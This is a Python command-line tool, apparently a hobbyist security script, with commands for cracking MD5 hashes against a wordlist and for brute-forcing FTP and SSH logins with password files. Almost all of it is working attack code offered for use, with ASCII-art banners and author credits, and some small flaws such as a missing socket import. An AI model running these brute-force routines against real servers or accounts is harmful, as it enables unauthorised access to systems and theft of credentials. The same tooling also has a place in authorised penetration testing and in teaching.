#!/usr/bin/env python3

import typer
import paramiko
import hashlib
import ftplib

VERSION="0.1"

app = typer.Typer()

@app.command()
def pas(
	hash: str = typer.Option(..., '--hash', '-h', help="Specify hash"),
	wordlist: typer.FileText = typer.Option(..., '--wordlist', '-w', help="Specify wordlist file"),
):
	"""
	To crack md5 hashes.
	"""
	typer.clear()

	for word in wordlist:
		# Encoding word
	    enc_wrd = word.encode('utf-8')
	    digest = hashlib.md5(enc_wrd.strip()).hexdigest()
	    typer.secho(f"[*] Trying {digest} ==> {word}", fg=typer.colors.GREEN) 

	    if digest == hash:
	        typer.secho(f"[*] Password is {word}", fg=typer.colors.BRIGHT_GREEN)
	        break

def crack(server, user, passfile):
	"""
	# TODO: write docstring
	"""
	for password in passfile:
		try:
			password = password.strip()
			typer.secho(f"trying: {password}", fg=typer.colors.GREEN)

			ftp = ftplib.FTP(server)
			if ftp.login(user, password):
				typer.secho(f"Password Found: {password}", fg=typer.colors.BRIGHT_GREEN)
				exit() # TODO: use typer.Exit() or typer.Abort() to exit

		except Exception as e:
			# TODO: handle connection not established
			typer.secho(f"Login Incorrect", fg=typer.colors.RED)

@app.command()
def ftp(
	server: str = typer.Option(..., '--server', '-s', help="Specify Server IP"),
	user: str = typer.Option(..., '--user', '-u', help="Specify User"),
	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify Password File"),
):
	"""
	To crack FTP login using wordlist based brute force attack.
	"""
	LOGO = '''
	 ______ _______ _____   _____ _____            _____ _  ________ _____  
	|  ____|__   __|  __ \ / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
	| |__     | |  | |__) | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
	|  __|    | |  |  ___/| |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
	| |       | |  | |    | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
	|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''

	CREDITS = '		  	\033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'

	typer.clear()  # clear the screen 
	# print logo and cretids
	typer.secho(LOGO, fg=typer.colors.BRIGHT_CYAN)
	typer.echo(CREDITS)  

	crack(server, user, passfile)

def sshconnect(host, username, password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		# Authentication Failed....
		code = 1
	except socket.error:
		# Connection Failed.... Host Down
		code = 2

	ssh.close()
	return code

'''
1.If sshconnect func return 0 to its caller should check the credentials used to connect to the SSH server be correct.

2.If sshconnect func return 1 to its caller should check the credentials used to connect to the SSH server be wrong.

3.If sshconnect func return 2 to its caller should check the connection fail i.e Host is down, Internet Connectivity or any error with the connection
'''

@app.command()
def ssh(
	host: str = typer.Option(..., '--host', '-h', help="Specify host address"),
	username: str = typer.Option(..., '--user', '-u', help="Specify username"),
	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify password file"),
):

	"""
	To crack SSH login using wordlist based brute force attack.
	"""

	LOGO = '''
	  _____ _____ _    _  _____ _____            _____ _  ________ _____  
	 / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
	| (___| (___ | |__| | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
	  \___ \\___ \|  __  | |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
	 ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
	|_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''

	CREDITS = '		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'
	
	typer.clear()
	# print logo and cretids
	typer.secho(LOGO, fg=typer.colors.BRIGHT_CYAN)
	typer.echo(CREDITS)
	  
	# Output
	for password in passfile:
		password = password.strip()
		try:
			response = sshconnect(host, username, password)
			if response == 0:
				typer.secho(f"[*] User: {username} [*] Password Found {password} [*] Login Correct", fg=typer.colors.BRIGHT_GREEN)
			elif response == 1:
				typer.secho(f"[*] User: {username} [*] Password {password} [*] Login Incorrect", fg=typer.colors.YELLOW)
			elif response == 2:
				typer.secho(f"[*] Connection could not be established to address {host}", fg=typer.colors.RED)
		except Exception as error:
			print (error)
			exit()

if __name__ == "__main__":
	app()